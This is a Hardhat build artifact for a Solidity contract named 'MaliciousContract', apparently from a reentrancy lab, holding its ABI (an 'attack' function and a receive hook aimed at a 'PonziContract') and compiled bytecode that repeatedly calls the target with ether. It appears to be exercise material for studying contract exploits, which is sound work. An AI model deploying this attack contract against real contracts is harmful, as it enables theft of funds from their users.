{
  "_format": "hh-sol-artifact-1",
  "contractName": "MaliciousContract",
  "sourceName": "contracts/ReentrancyContract.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_ponziAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "ponzi",
      "outputs": [
        {
          "internalType": "contract PonziContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105e33803806105e3833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6104cc806101176000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc14610039578063ccb048411461004357610034565b3661003457005b600080fd5b61004161006e565b005b34801561004f57600080fd5b506100586101b8565b604051610065919061025b565b60405180910390f35b670de0b6b3a76400003410156100b9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100b0906102d3565b60405180910390fd5b60005b600a8110156101b55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d17e777d670de0b6b3a7640000600067ffffffffffffffff811115610125576101246102f3565b5b6040519080825280602002602001820160405280156101535781602001602082028036833780820191505090505b506040518363ffffffff1660e01b815260040161017091906103f2565b6000604051808303818588803b15801561018957600080fd5b505af115801561019d573d6000803e3d6000fd5b505050505080806101ad9061044d565b9150506100bc565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061022161021c610217846101dc565b6101fc565b6101dc565b9050919050565b600061023382610206565b9050919050565b600061024582610228565b9050919050565b6102558161023a565b82525050565b6000602082019050610270600083018461024c565b92915050565b600082825260208201905092915050565b7f496e73756666696369656e742045746865720000000000000000000000000000600082015250565b60006102bd601283610276565b91506102c882610287565b602082019050919050565b600060208201905081810360008301526102ec816102b0565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000610359826101dc565b9050919050565b6103698161034e565b82525050565b600061037b8383610360565b60208301905092915050565b6000602082019050919050565b600061039f82610322565b6103a9818561032d565b93506103b48361033e565b8060005b838110156103e55781516103cc888261036f565b97506103d783610387565b9250506001810190506103b8565b5085935050505092915050565b6000602082019050818103600083015261040c8184610394565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b600061045882610443565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561048b5761048a610414565b5b60018201905091905056fea264697066735822122010923f7c59158479fba03fc48c88f09a4a8e72bd7f906b77eb88fdae101fb2b264736f6c634300080a0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}